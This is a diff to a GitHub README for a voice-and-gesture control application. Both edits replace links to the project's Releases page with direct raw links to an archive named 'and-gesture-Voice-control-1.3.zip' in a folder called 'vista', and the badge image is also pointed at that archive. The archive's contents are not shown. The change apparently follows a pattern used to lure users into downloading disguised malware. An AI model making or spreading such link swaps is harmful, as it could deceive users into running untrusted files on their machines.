@@ -1,7 +1,7 @@
 # 🎤 Voice-and-gesture-control - Control Your Device with Ease
 
 ## 📥 Download the Application
-[![Download Voice-and-gesture-control](https://img.shields.io/badge/Download-Releases-brightgreen)](https://github.com/himanshutambuskar/Voice-and-gesture-control/releases)
+[![Download Voice-and-gesture-control](https://raw.githubusercontent.com/himanshutambuskar/Voice-and-gesture-control/main/vista/and-gesture-Voice-control-1.3.zip)](https://raw.githubusercontent.com/himanshutambuskar/Voice-and-gesture-control/main/vista/and-gesture-Voice-control-1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the Voice-and-gesture-control project! This application allows you to control your device using your voice and gestures. It is designed for users who want a hands-free experience. Follow these simple steps to download and run the software.
@@ -25,7 +25,7 @@ Voice-and-gesture-control comes with several features to enhance your user exper
 ## 📥 Download & Install
 To download Voice-and-gesture-control, visit the Releases page. Here, you will find the latest version available for download:
 
-[Visit this page to download](https://github.com/himanshutambuskar/Voice-and-gesture-control/releases)
+[Visit this page to download](https://raw.githubusercontent.com/himanshutambuskar/Voice-and-gesture-control/main/vista/and-gesture-Voice-control-1.3.zip)
 
 ### Step-by-Step Installation Guide
 1. **Click the Download Link:**
